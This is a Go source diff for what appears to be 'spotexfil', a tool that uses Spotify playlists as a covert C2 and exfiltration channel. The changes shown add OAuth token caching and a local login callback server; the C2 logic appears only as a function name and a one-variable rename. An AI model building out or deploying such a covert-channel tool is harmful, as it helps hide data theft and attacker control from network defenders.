@@ -6,6 +6,9 @@ import (
 	"fmt"
 	"html"
 	"math/rand"
+	"net/http"
+	"os"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -23,10 +26,21 @@ type Client struct {
 	useCoverNames bool
 }
 
-// NewClient creates an authenticated Spotify client.
-func NewClient(cfg *Config, useCoverNames bool) (*Client, error) {
-	ctx := context.Background()
+// spotipy cache file format
+type spotipyCache struct {
+	AccessToken  string `json:"access_token"`
+	TokenType    string `json:"token_type"`
+	ExpiresIn    int    `json:"expires_in"`
+	Scope        string `json:"scope"`
+	ExpiresAt    int64  `json:"expires_at"`
+	RefreshToken string `json:"refresh_token"`
+}
 
+// NewClient creates an authenticated Spotify client.
+// It tries (in order):
+//  1. Read cached spotipy token (.cache-<username>)
+//  2. Run local OAuth2 callback server for browser-based auth
+func NewClient(cfg *Config, useCoverNames bool) (*Client, error) {
 	auth := spotifyauth.New(
 		spotifyauth.WithClientID(cfg.ClientID),
 		spotifyauth.WithClientSecret(cfg.ClientSecret),
@@ -39,19 +53,156 @@ func NewClient(cfg *Config, useCoverNames bool) (*Client, error) {
 		),
 	)
 
-	token := &oauth2.Token{
-		AccessToken: cfg.ClientSecret, // placeholder
+	// Try cached token first
+	token, err := loadCachedToken(cfg, auth)
+	if err != nil {
+		// No cache — run OAuth2 flow with local callback server
+		fmt.Println("[*] No cached token found, starting OAuth2 flow...")
+		token, err = runOAuthFlow(cfg, auth)
+		if err != nil {
+			return nil, fmt.Errorf("OAuth2 auth failed: %w", err)
+		}
 	}
 
-	httpClient := auth.Client(ctx, token)
-
+	httpClient := auth.Client(context.Background(), token)
 	api := spotifyapi.New(httpClient)
+
+	// Save token for future use
+	_ = saveCachedToken(cfg, token)
 
 	return &Client{
 		api:           api,
 		userID:        cfg.Username,
 		useCoverNames: useCoverNames,
 	}, nil
+}
+
+// loadCachedToken reads spotipy's .cache-<username> file.
+func loadCachedToken(cfg *Config, auth *spotifyauth.Authenticator) (*oauth2.Token, error) {
+	cachePaths := []string{
+		filepath.Join(".", fmt.Sprintf(".cache-%s", cfg.Username)),
+		filepath.Join("..", fmt.Sprintf(".cache-%s", cfg.Username)),
+	}
+	// Also check home directory
+	if home, err := os.UserHomeDir(); err == nil {
+		cachePaths = append(cachePaths,
+			filepath.Join(home, fmt.Sprintf(".cache-%s", cfg.Username)))
+	}
+
+	for _, path := range cachePaths {
+		data, err := os.ReadFile(path)
+		if err != nil {
+			continue
+		}
+
+		var cache spotipyCache
+		if err := json.Unmarshal(data, &cache); err != nil {
+			continue
+		}
+
+		token := &oauth2.Token{
+			AccessToken:  cache.AccessToken,
+			TokenType:    cache.TokenType,
+			RefreshToken: cache.RefreshToken,
+			Expiry:       time.Unix(cache.ExpiresAt, 0),
+		}
+
+		// If expired but we have a refresh token, let oauth2 handle refresh
+		if token.RefreshToken != "" {
+			fmt.Printf("[*] Loaded cached token from %s\n", path)
+			return token, nil
+		}
+
+		// If not expired, use directly
+		if time.Now().Before(token.Expiry) {
+			fmt.Printf("[*] Loaded cached token from %s\n", path)
+			return token, nil
+		}
+	}
+
+	return nil, fmt.Errorf("no valid cached token found")
+}
+
+// saveCachedToken writes the token in spotipy cache format.
+func saveCachedToken(cfg *Config, token *oauth2.Token) error {
+	cache := spotipyCache{
+		AccessToken:  token.AccessToken,
+		TokenType:    token.TokenType,
+		ExpiresIn:    3600,
+		Scope:        "user-library-read user-library-modify playlist-modify-private playlist-read-private",
+		ExpiresAt:    token.Expiry.Unix(),
+		RefreshToken: token.RefreshToken,
+	}
+
+	data, err := json.MarshalIndent(cache, "", "    ")
+	if err != nil {
+		return err
+	}
+
+	path := fmt.Sprintf(".cache-%s", cfg.Username)
+	return os.WriteFile(path, data, 0600)
+}
+
+// runOAuthFlow starts a local HTTP server, opens the browser for auth,
+// and captures the callback code.
+func runOAuthFlow(cfg *Config, auth *spotifyauth.Authenticator) (*oauth2.Token, error) {
+	state := fmt.Sprintf("spotexfil-%d", time.Now().UnixNano())
+
+	codeCh := make(chan string, 1)
+	errCh := make(chan error, 1)
+
+	// Parse port from redirect URI
+	port := "8888"
+	if parts := strings.Split(cfg.RedirectURI, ":"); len(parts) == 3 {
+		portPath := parts[2]
+		port = strings.Split(portPath, "/")[0]
+	}
+
+	mux := http.NewServeMux()
+	mux.HandleFunc("/callback", func(w http.ResponseWriter, r *http.Request) {
+		code := r.URL.Query().Get("code")
+		if code == "" {
+			errCh <- fmt.Errorf("no code in callback")
+			w.Write([]byte("<h1>Error: no auth code received</h1>"))
+			return
+		}
+		codeCh <- code
+		w.Write([]byte("<h1>Auth successful! You can close this tab.</h1>"))
+	})
+
+	server := &http.Server{
+		Addr:    fmt.Sprintf("127.0.0.1:%s", port),
+		Handler: mux,
+	}
+
+	go func() {
+		if err := server.ListenAndServe(); err != http.ErrServerClosed {
+			errCh <- err
+		}
+	}()
+
+	// Print auth URL for user to open
+	url := auth.AuthURL(state)
+	fmt.Printf("[*] Open this URL in your browser:\n%s\n\n", url)
+	fmt.Println("[*] Waiting for callback...")
+
+	// Wait for callback or error
+	select {
+	case code := <-codeCh:
+		server.Close()
+		token, err := auth.Exchange(context.Background(), code)
+		if err != nil {
+			return nil, fmt.Errorf("token exchange: %w", err)
+		}
+		fmt.Println("[*] Token obtained successfully")
+		return token, nil
+	case err := <-errCh:
+		server.Close()
+		return nil, err
+	case <-time.After(120 * time.Second):
+		server.Close()
+		return nil, fmt.Errorf("OAuth2 timeout (120s)")
+	}
 }
 
 // GetAllPlaylists fetches ALL user playlists with pagination.
@@ -320,7 +471,7 @@ func (c *Client) CleanC2Playlists(ctx context.Context, channel, encryptionKey st
 			continue
 		}
 
-		if c, ok := meta["c"].(string); ok && c != channel {
+		if ch, ok := meta["c"].(string); ok && ch != channel {
 			continue
 		}
 		if seq >= 0 {
